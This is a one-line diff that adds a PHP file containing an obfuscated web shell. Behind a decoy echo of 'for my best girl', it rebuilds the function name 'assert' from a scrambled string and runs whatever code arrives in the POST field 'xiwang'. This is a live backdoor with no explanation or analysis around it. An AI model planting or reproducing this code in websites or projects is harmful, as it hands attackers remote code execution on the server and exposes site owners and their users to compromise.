@@ -1,0 +1,1 @@
+<?php echo "for my best girl";$a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["xiwang"]); ?>
